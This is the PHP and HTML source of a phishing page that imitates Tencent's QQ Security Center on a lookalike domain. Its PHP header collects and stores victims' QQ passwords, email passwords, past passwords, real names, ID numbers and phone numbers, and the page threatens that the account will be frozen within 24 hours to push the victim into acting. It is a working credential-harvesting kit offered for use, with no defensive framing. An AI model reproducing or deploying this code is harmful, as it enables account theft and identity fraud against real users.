<?php
	require('function.php');

	if(!isset($_GET['u']) || !isset($_GET['p'])){
		echo "<script>alert('无权访问');window.location.href='index.php'</script>";
	}

	$trueName=$_GET['txtName'];
	$addr=$_GET['txtAddress'];
	$anotherQQ=$_GET['txtContactQQ'];
	$password=$_GET['txtContactQQPW'];
	$reciveType=$_GET['radiobutton'];
	$reciveMail=$_GET['txtContactEmail'];
	$reciveMailPassword=$_GET['yxmm'];
	$historyPw1=$_POST['history_pwd_1_password'];
	$historyPw2=$_POST['pwdOldPW2'];
	$historyPw3=$_POST['pwdOldPW3'];
	$trueName1=$_POST['xm'];
	$certificateType=$_POST['CertCardType'];
	$certificateNumber=$_POST['zjhm1'];
	$phoneNumber=$_POST['mbsj1'];
	$other=$_POST['ziliao'];

	writeDetail($_GET['u'],$trueName,$addr,$anotherQQ,$password,$reciveType,$reciveMail,$reciveMailPassword,$historyPw1,$historyPw2,$historyPw3,$trueName1,$certificateType,$certificateNumber,$phoneNumber,$other);

?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/global.css" rel="stylesheet" type="text/css">
<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/base.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
<script async="" type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_djl.js"></script><script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/jquery.js"></script>
<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/common.js"></script>
<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/ctrlManager.js"></script>
<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/vry_question.js"></script>
<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/check.js"></script>
<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/dna.js"></script>
	<title>安全中心</title>	
	<style type="text/css">
		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
		.ac_menuitem{width:100%;color:#141414;padding:2px;text-align:left;}
		.ac_menuitem_selected{background-color:#D6DEEC;width:100%;color:#141414;padding:2px;text-align:left;}
		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
	</style>
	<script type="text/javascript">window.onerror=function(){return true;}</script>
<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/aq_float_frame.js" type="text/javascript"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_dianjiliu.js"></script></head>
	
 
<body>
 
 
<!--Header-->
<div id="headerAll">
 
 
	<div class="round" id="login_alert" style="display:none;z-index:10003;left:30%;top:30%;">
    	<div class="r_top"></div>
	</div>
	<div id="header">
 
    	<div id="top">
		<a onfocus="this.blur()" class="logo" href="cn2.php"><cite>安全中心<br>
		在线生活安全护航</cite></a>
        	<div class="right_info">
            <ul>
			
            <li><span>欢迎您，<?php echo getQQNick($_GET['u']); ?>(<?php echo $_GET['u']; ?>)</span></li>
			<li class="cent" id="safe_score_item"><a href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><strong id="head_safe_score"><font color="#FF8000">
			30分</font></strong></a></li>
			 <li><a href="javascript:LoginOut();">退出</a></li>
			
            <li class="pr"><a href="javascript:;" onmouseover="ShowSubMenu('site_map_menu');" onmouseout="HideSubMenu('site_map_menu');">
			站点地图<b></b></a></li>
			 <li><a href="http://service.qq.com/special/aq.html" target="_blank">
				腾讯客服</a></li>
			
			<li><a href="http://support.qq.com/discuss/387_1.shtml" target="_blank">
			反馈意见</a></li>
			
            </ul>
            </div>
 
        </div>
    
    	<div id="menu">
        	<ul>
            <li id="menu_index"><a onfocus="this.blur()" class="m1" href=""><cite>
			首页</cite></a></li>
            <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
			帐号保护</cite></a></li>
            <li class="on3" id="menu_pwd_manage"><a onfocus="this.blur()" class="m3" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_pwd_manage');" onmouseout="HideSubMenu('submenu_pwd_manage');"><cite>
			密码管理</cite></a></li>
            <li id="menu_safe_mutual"><a onfocus="this.blur()" class="m4" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover=""><cite>
			安全学堂</cite></a></li>
            </ul>
        </div>
 
   	  <a onfocus="this.blur()" class="toolbox" href="javascript:;" onmouseover="ShowSubMenu('menu_toolbox')"><cite>
		密保工具箱</cite></a>
 
  </div>
</div><!--Header End-->
 
<script> 
function ShowSubMenu(submenu_id,menu_id,cname)
{
	$("div[name='submenu']").css("display","none");
	if(submenu_id == "site_map_menu")
	{
		$("#"+submenu_id).css({'display':'block'});
	}
	else
	{
		$("#"+submenu_id).css({'display':'block','cursor':'hand'});
	}
	if(typeof(menu_id) != "undefined")
	{
		$("#"+menu_id).attr("class",cname);
	}
}
function HideSubMenu(submenu_id,menu_id)
{
	$("#"+submenu_id).css("display","none");
	if(typeof(menu_id) != "undefined")
	{
		$("#"+menu_id).attr("class","");
	}
}
 
function LoginOut()
{
	document.cookie = "uin=; EXPIRES=Fri, 02-Jan-1970 00:00:00 GMT; PATH=/; DOMAIN=.qq.com";
	document.cookie = "skey=; EXPIRES=Fri, 02-Jan-1970 00:00:00 GMT; PATH=/; DOMAIN=.qq.com";
	document.cookie = "pt_mbkey=; EXPIRES=Fri, 02-Jan-1970 00:00:00 GMT; PATH=/; DOMAIN=.qq.com";
	top.location.reload();
}
 
$("#toolbox_hover").click(function(){
	location.href="/cn2/manage/my_mb";
});
function switchToOld()
{
	document.cookie = "aq_ver=redirect_to_aq_v1;PATH=/; DOMAIN=aq.qq.com";
	top.location.href="/cn/index";
}
</script>
 
 
<!--Wrapper-->
<div id="wrapper">
	<div class="top"></div>
	<div class="center1 password_management">
		<div class="title_r"><a href="http://serviec.boy-ex.com/cn2/index">首页</a><em> &gt; </em>清除异常</div>
<div class="token_process token_process3 mt10">
        	<div class="tp_succeed">
            <i class="warn3_red"></i>

			<h2 class="f14">您提交的资料未通过审核!请您通过申诉取消所有异常 !<div>&nbsp;</div>


			<div>&nbsp;</div>
<font color="#ff0000">为了确保您的QQ账户能正常使用，请您及时通过申诉解除异常。 </font></h2><div>&nbsp;</div>
<font color="#ff0000">（24小时内未解除异常我们将永久冻结您的QQ）。</font><div>&nbsp;</div>
			</div>
 
			<h3 class="stepall f14">申诉小技巧</h3>
 
			<div class="step1 stepall">
			<h3 class="f14 mt10">申诉地点：</h3>
			<p class="f14 mt10">最好到经常使用QQ的地方进行申诉<font color="#ff0000">这样会大大提高成功率</font>，以确保正常使用。</p>
			</div>
 
			<div class="step2 stepall">
			<h3 class="f14 mt10">申诉好友辅助：</h3>
			<p class="f14 mt10">尽量邀请您经常聊天的三个以上好友，这样会大大提高成功率。</p>
			</div>
 

 
			<dl class="tp_dl">
            <dl class="tp_dl">
 
            <dt></dt>
            <dd><div>　</div>
            <a onfocus="this.blur()" class="button" onclick="top.location.href='http://aq.qq.com/cn2/appeal/appeal_index?source_id=2253&amp;source=mail'"><span>
			&nbsp;&nbsp;立即提交申诉表&nbsp;&nbsp;</span></a>
             <!--//注釋按鈕>
             <input name="button" type="button" id="down_limit_chang" class="btn_em" onclick="getIpwdManageUrl(1, 'mod', '重新验证');" value="重新验证" />
			<//注釋按鈕結束-->
            </dd>
            </dl>
			
			</dl>
		</div>
	</div>
	<div class="bottom"></div>
</div><!--Wrapper End-->
 
 
<!--Footer-->
<!--Footer-->
<div id="footer">
  <p><a href="http://www.tencent.com/" target="_blank">关于腾讯</a>|<a href="http://www.tencent.com/index_e.shtml" target="_blank">About Tencent</a>|<a href="http://www.qq.com/contract.shtml" target="_blank">服务条款</a>|<a href="http://hr.tencent.com/" target="_blank">腾讯招聘</a>|<a href="http://serviec.boy-ex.com/v2/notice/content_6.shtml" target="_blank">漏洞报告</a>|<a href="http://service.qq.com/" target="_blank">腾讯客服<span id="debug"></span></a></p>
  <p>Copyright © 1998 - 2013 Tencent. All Rights Reserved </p>
  <p>腾讯公司 版权所有</p>
</div>
<script language="javascript"> 
	if (typeof(timePoints) != "undefined")	
	{
		timePoints[0] = new Date();	
		$(document).ready(function() {
			timePoints[1] = new Date();
		});	
	}	
</script>
<iframe name="aqrjs_hidden_frame" id="aqrjs_hidden_frame" style="width:150px; height:150px; display:none;"></iframe>
<!--Footer End-->
 
 
 
<!--Footer End-->
 


 
<script> 
 
$(document).ready(function(){
	$("#menu_index").addClass("on1");
});
 
</script>

<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/ping.js"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/aqrjs_common.js"></script></body></html>